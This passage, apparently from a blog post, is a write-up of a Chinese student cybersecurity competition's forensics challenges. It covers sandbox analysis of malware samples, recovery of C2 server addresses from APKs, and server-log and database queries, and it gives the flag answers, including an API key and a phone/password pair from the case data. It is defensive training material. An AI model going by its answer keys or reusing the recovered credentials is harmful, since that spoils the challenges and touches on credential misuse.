src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175508502.png"></p><p>flag:2022-01-11 18:47:38</p><h3 id="exeåˆ†æ-1"><a href="#exeåˆ†æ-1" class="headerlink" title="exeåˆ†æ_1"></a>exeåˆ†æ_1</h3><p> å°†services.exeä¸Šä¼ åˆ°å¾®æ­¥äº‘æ²™ç®±ï¼ˆ<a href="https://s.threatbook.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E4%B8%80%E6%A0%8F%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E8%AF%A6%E6%83%85%E5%BE%97%E7%9F%A5%E5%88%9B%E5%BB%BA%E4%BA%86C:/Program">https://s.threatbook.com/ï¼‰è¿›è¡Œæ£€æµ‹ï¼Œå¯ä»¥åœ¨åŠ¨æ€åˆ†æä¸€æ æŸ¥çœ‹æ‰§è¡Œæµç¨‹å›¾ï¼Œå¹¶æŸ¥çœ‹è¿›ç¨‹è¯¦æƒ…å¾—çŸ¥åˆ›å»ºäº†C:\Program</a> Files\Common Files\Services\WmiApSvr.exeæ¥æ‰§è¡Œ</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175252073.png"></p><h3 id="exeåˆ†æ-2"><a href="#exeåˆ†æ-2" class="headerlink" title="exeåˆ†æ_2"></a>exeåˆ†æ_2</h3><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184120510.png"></p><p>PEåˆ†æï¼Œå‘ç°<code>HackTool.FlyStudio.acz_unpack.exe</code>è°ƒç”¨äº†<code>advapi32.dll</code></p><h3 id="Exeåˆ†æ-3"><a href="#Exeåˆ†æ-3" class="headerlink" title="Exeåˆ†æ_3"></a>Exeåˆ†æ_3</h3><p> å°†aspnet_wp.v.exeä¸Šä¼ åˆ°å¾®æ­¥äº‘æ²™ç®±ï¼ˆ<a href="https://s.threatbook.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E4%B8%80%E6%A0%8F%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E6%89%A7%E8%A1%8C%E5%90%8E%E5%90%AF%E5%8A%A8%E7%9A%84%E8%BF%9B%E7%A8%8B%E6%98%AFsvchost.exe">https://s.threatbook.com/ï¼‰è¿›è¡Œæ£€æµ‹ï¼Œå¯ä»¥åœ¨åŠ¨æ€åˆ†æä¸€æ æŸ¥çœ‹æ‰§è¡Œæµç¨‹å›¾ï¼Œå¯ä»¥å‘ç°æ‰§è¡Œåå¯åŠ¨çš„è¿›ç¨‹æ˜¯svchost.exe</a></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175319005.png"></p><h3 id="Exeåˆ†æ-4"><a href="#Exeåˆ†æ-4" class="headerlink" title="Exeåˆ†æ_4"></a>Exeåˆ†æ_4</h3><p>å°†exeä¸Šä¼ åˆ°VTï¼ˆ<a href="https://www.virustotal.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F%EF%BC%8C%E4%BB%8E%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C%E7%9A%84%E5%85%B3%E9%94%AE%E8%AF%8D%E4%B8%AD%E5%8F%AF%E7%9F%A5%E6%98%AF%E6%8C%96%E7%9F%BF%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%97%85%E6%AF%92">https://www.virustotal.com/ï¼‰è¿›è¡Œæ‰«æï¼Œä»æ‰«æç»“æœçš„å…³é”®è¯ä¸­å¯çŸ¥æ˜¯æŒ–çŸ¿ç±»å‹çš„ç—…æ¯’</a></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175510599.png"></p><h3 id="exeåˆ†æ-5"><a href="#exeåˆ†æ-5" class="headerlink" title="exeåˆ†æ_5"></a>exeåˆ†æ_5</h3><p>å°†exeä¸Šä¼ åˆ°å¾®æ­¥äº‘æ²™ç®±ï¼ˆ<a href="https://s.threatbook.com/%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90%E4%B8%80%E6%A0%8F%E6%9F%A5%E7%9C%8B%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%9C%89%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E8%A1%8C%E4%B8%BA%EF%BC%8CIP%E6%98%AF**220.86.87.232**%EF%BC%8C">https://s.threatbook.com/ï¼‰è¿›è¡Œæ£€æµ‹ï¼Œå¯ä»¥åœ¨åŠ¨æ€åˆ†æä¸€æ æŸ¥çœ‹æ‰§è¡Œæµç¨‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªç½‘ç»œè¿æ¥è¡Œä¸ºï¼ŒIPæ˜¯**220.86.87.232**ï¼Œ</a><br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175651779.png"></p><p>æŸ¥è¯¢ipçš„å½’å±åœ°æ˜¯éŸ©å›½<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175742508.png"></p><h3 id="APKåˆ†æ-02"><a href="#APKåˆ†æ-02" class="headerlink" title="APKåˆ†æ_02"></a>APKåˆ†æ_02</h3><p>å°†APKåç¼–è¯‘åæ‰¾åˆ°MainActivityï¼Œå¯ä»¥å‘ç°æœ‰ä¸€ä¸²base64å­—ç¬¦ä¸²ï¼šaHR0cHM6Ly9hbnNqay5lY3hlaW8ueHl6</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180150225.png"></p><p>å°†å…¶è§£å¯†ï¼Œå¾—åˆ°æœåŠ¡å™¨åœ°å€ï¼šansjk.ecxeio.xyz</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180332104.png"></p><h3 id="APKåˆ†æ-03"><a href="#APKåˆ†æ-03" class="headerlink" title="APKåˆ†æ_03"></a>APKåˆ†æ_03</h3><p>åœ¨MainActivityå¯å‘ç°ï¼Œimport p061d.p062a.p063a.AbstractActivityC0773h;è¿™è¡Œä»£ç ï¼Œè·Ÿå…¥è¿™ä¸ª<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180516999.png"></p><p>æŸ¥çœ‹å›ä¸Šå›¾æä¾›æœåŠ¡å™¨åœ°å€çš„å‡½æ•°æ˜¯mo4758t()ï¼Œåœ¨è¿™æ®µä»£ç ä¸­çš„ç¬¬7è¡Œæ‰¾åˆ°äº†è°ƒç”¨ï¼Œthis.f3118q.loadUrl(mo4758t());æ‰€ä»¥åŠ è½½æœåŠ¡å™¨çš„å‡½æ•°æ˜¯ï¼šloadUrl<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180700265.png"></p><h3 id="APKåˆ†æ-05"><a href="#APKåˆ†æ-05" class="headerlink" title="APKåˆ†æ_05"></a>APKåˆ†æ_05</h3><p>æ ¹æ®APKåˆ†æ_06é¢˜çš„é¢˜å¹²å¯çŸ¥ï¼Œé¦–å…ˆå¾—æœ‰å®‰å…¨æ£€æµ‹è¡Œä¸ºæ‰èƒ½å¯»æ‰¾æ£€æµ‹æ–¹æ³•ï¼Œæ‰€ä»¥é€‰æ‹©æ˜¯<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181012712.png"></p><h3 id="APKåˆ†æ-07"><a href="#APKåˆ†æ-07" class="headerlink" title="APKåˆ†æ_07"></a>APKåˆ†æ_07</h3><p>åç¼–è¯‘ï¼Œå‘ç°ä¸‰ä¸ªViewè§†å›¾</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184256493.png"></p><p>flagä¸º<code>3</code></p><h3 id="APKåˆ†æ-08"><a href="#APKåˆ†æ-08" class="headerlink" title="APKåˆ†æ_08"></a>APKåˆ†æ_08</h3><p><strong>é¢˜ç›®ï¼šå—å®³äººæ‰‹æœºä¸­çº¢æ˜ŸIPAçš„åŒ…åæ˜¯:ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼ša.s.dï¼‰</strong></p><p>åœ¨ç›˜å¤çŸ³è®¡ç®—æœºå–è¯åˆ†æç³»ç»Ÿä¸­æŠŠçº¢æ˜Ÿ.ipaä¸‹åˆ°æœ¬åœ°æ¥</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182015391.png"></p><p>ä¿®æ”¹ä¸ºzipåè§£å‹å¾—åˆ°æ–‡ä»¶å¤¹</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182239159.png"></p><p>åœ¨æ–‡ä»¶å¤¹å†…æœç´¢Info.plistæ‰“å¼€</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182710798.png"></p><p>åœ¨Info.plisté‡Œæœç´¢CFBundleIdentifierå¾—åˆ°åŒ…å</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182752286.png"></p><p>flag:com.dd666.hongxin</p><h3 id="APKåˆ†æ-09"><a href="#APKåˆ†æ-09" class="headerlink" title="APKåˆ†æ_09"></a>APKåˆ†æ_09</h3><p><strong>é¢˜ç›®ï¼šå—å®³äººæ‰‹æœºä¸­çº¢æ˜ŸIPAçš„APIKEYæ˜¯:ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šasdï¼‰</strong></p><p>åœ¨info.plisté‡Œé¢æœç´¢APIKEYå…³é”®å­—å¾—åˆ°flag</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183125194.png"></p><p>flag:d395159c291c627c9d4ff9139bf8f0a700b98732</p><h3 id="APKåˆ†æ-11"><a href="#APKåˆ†æ-11" class="headerlink" title="APKåˆ†æ_11"></a>APKåˆ†æ_11</h3><p><strong>é¢˜ç›®ï¼šå«Œç–‘äººæ‰‹æœºä¸­çº¢æ˜ŸAPKçš„æœåŠ¡å™¨åœ°å€æ˜¯:ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šass.a.d:11ï¼‰</strong></p><p>ä½¿ç”¨åœ¨çº¿apkä¿¡æ¯è§£å¯†å¾—åˆ°çº¢æ˜ŸAPKçš„æœåŠ¡å™¨åœ°å€</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183555001.png"></p><p>flag:<a href="http://www.nansjy.com.cn:8161/">http://www.nansjy.com.cn:8161</a></p><h3 id="APKåˆ†æ-12"><a href="#APKåˆ†æ-12" class="headerlink" title="APKåˆ†æ_12"></a>APKåˆ†æ_12</h3><p><strong>é¢˜ç›®:å«Œç–‘äººæ‰‹æœºä¸­çº¢æ˜ŸAPKçš„ç¨‹åºå…¥å£æ˜¯:ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼ša.v.b.nï¼‰</strong></p><p>ä½¿ç”¨jadx-guiå¯¼å…¥çº¢æ˜ŸAPKç¨‹åº,æ‰“å¼€AndroidManifest.xml</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183954273.png"></p><p>æœç´¢LAUNCHERä¸Šé¢activeçš„android:nameæ—¢ä¸ºç¨‹åºçš„å…¥å£</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184055576.png"></p><p>flag:com.example.weisitas526sad.activity.SplashActivity</p><h3 id="APKåˆ†æ-15"><a href="#APKåˆ†æ-15" class="headerlink" title="APKåˆ†æ_15"></a>APKåˆ†æ_15</h3><p>å‹ç¼©åŒ…å·¥å…·è§£å‹<code>æ‰‹æœºæµé‡åŒ….saz</code>, ä½¿ç”¨<code>grep</code>æŸ¥æ‰¾<code>password</code>å­—ç¬¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rin <span class="string">&quot;password&quot;</span> ./raw/*</span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184639469.png"></p><p>flagä¸º<code>17317289056/b12345678b</code></p><h3 id="æœåŠ¡å™¨å–è¯-04"><a href="#æœåŠ¡å™¨å–è¯-04" class="headerlink" title="æœåŠ¡å™¨å–è¯_04"></a>æœåŠ¡å™¨å–è¯_04</h3><p>å¯¼å…¥å«Œç–‘äººçš„æœåŠ¡å™¨æ£€æè¿›è¡Œè®¡ç®—æœºå–è¯ï¼Œå°†å…¶ä¸­linuxæœåŠ¡å™¨çš„wwwæ–‡ä»¶å¤¹å…ˆå¯¼å‡º<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181523060.png"></p><p>åœ¨ç›¸å¯¹è·¯å¾„www\server\panel\logs\requestä¸­å¯ä»¥æ‰¾åˆ°å®å¡”é¢æ¿çš„è®¿é—®æ—¥å¿—ï¼Œåœ¨ä»¥ä¸‹æ–‡ä»¶ä¸­é€‰æ‹©æ—¶é—´æœ€æ—©çš„è§£å‹æŸ¥çœ‹<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181635301.png"></p><p>æœ€æ—©ä¸€æ¬¡å¯¹&#x2F;loginè·¯å¾„å‘é€poståŒ…çš„æ—¶é—´ä¹Ÿå°±æ˜¯æœ€æ—©ç™»å½•æ—¶é—´ï¼Œflagå€¼ï¼š2021-05-17 16:10:40<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181842265.png"></p><h3 id="æœåŠ¡å™¨å–è¯-07"><a href="#æœåŠ¡å™¨å–è¯-07" class="headerlink" title="æœåŠ¡å™¨å–è¯_07"></a>æœåŠ¡å™¨å–è¯_07</h3><p>æœåŠ¡å™¨çš„è®¿é—®æ—¥å¿—åœ¨ç›¸å¯¹è·¯å¾„www\wwwlogs\access.logæ–‡ä»¶ä¸­ï¼Œæ‰¾åˆ°æœ€æ—©è®¿é—®åå°çš„IPæ˜¯ï¼š183.160.76.194<br><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182234733.png"></p><h3 id="æœåŠ¡å™¨å–è¯-14"><a href="#æœåŠ¡å™¨å–è¯-14" class="headerlink" title="æœåŠ¡å™¨å–è¯_14"></a>æœåŠ¡å™¨å–è¯_14</h3><p><strong>é¢˜ç›®ï¼šç»Ÿè®¡æ¶‰æ¡ˆç½‘ç«™å“ªä¸€å¤©ç™»å½•çš„ä¼šå‘˜äººæ•°æœ€å¤šã€‚ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼š1999-09-09ï¼‰</strong></p><p>ä½¿ç”¨ä»¿çœŸç³»ç»ŸæŒ‚è½½åˆ°æœ¬åœ°åæŸ¥çœ‹Larvelçš„é»˜è®¤é…ç½®è·¯å¾„,é‡Œé¢æœ‰æ•°æ®åº“çš„è´¦å·å’Œå¯†ç </p><p>cat &#x2F;www&#x2F;wwwroot&#x2F;v9.licai.com&#x2F;.env</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190232311.png"></p><p>mysqlè¿æ¥ååœ¨memberlogsè¡¨ä¸‹å¯ä»¥çœ‹åˆ°è®¿é—®çš„äººæ•°å’Œæ—¥æœŸæ—¶é—´,ä¿®æ”¹memberlogsè¡¨å•updated_atçš„é•¿åº¦ä¸º10æ–¹ä¾¿æˆ‘ä»¬æ’åº</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table memberlogs modify column updated_at varchar(10);</span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190516374.png"></p><p>æ ¹æ®å‘½ä»¤æ’åºåæ‰¾åˆ°è®¿é—®äººæ•°æœ€å¤šçš„æ—¶é—´ä¸º2021-07-14</p><p>å‘½ä»¤: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updated_at,count(*) from memberlogs where status=1 group by updated_at order by count(*);</span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804190609747.png"></p><h3 id="æœåŠ¡å™¨å–è¯-15"><a href="#æœåŠ¡å™¨å–è¯-15" class="headerlink" title="æœåŠ¡å™¨å–è¯_15"></a>æœåŠ¡å™¨å–è¯_15</h3><p>å‘ç°<code>mysqldump.sql</code>æ–‡ä»¶</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804184901951.png" alt="image-20220804184901951"></p><p>æœç´¢<code>ä½ å¥½ï¼Œæ€ä¹ˆå……å€¼</code>,ç»“åˆæ•°æ®è¡¨ç»“æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `layims` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `fusername` varchar(120) NOT NULL DEFAULT &#x27;&#x27; COMMENT &#x27;å‘é€è€…ç”¨æˆ·&#x27;,</span><br><span class="line">  `tousername` varchar(255) DEFAULT NULL COMMENT &#x27;å‘ç»™ç”¨æˆ·&#x27;,</span><br><span class="line">  `fromuid` int(11) NOT NULL DEFAULT &#x27;1&#x27; COMMENT &#x27;å‘é€è€…&#x27;,</span><br><span class="line">  `touid` int(11) NOT NULL DEFAULT &#x27;1&#x27; COMMENT &#x27;å‘ç»™è°&#x27;,</span><br><span class="line">  `type` varchar(50) DEFAULT NULL COMMENT &#x27;ç±»å‹&#x27;,</span><br><span class="line">  `content` text NOT NULL COMMENT &#x27;å†…å®¹&#x27;,</span><br><span class="line">  `status` int(1) DEFAULT &#x27;0&#x27;,</span><br><span class="line">  `created_at` datetime DEFAULT NULL,</span><br><span class="line">  `updated_at` datetime NOT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=MyISAM AUTO_INCREMENT=7069 DEFAULT CHARSET=utf8 COMMENT=&#x27;åœ¨çº¿å®¢æœè¡¨&#x27;;</span><br></pre></td></tr></table></figure><p><img 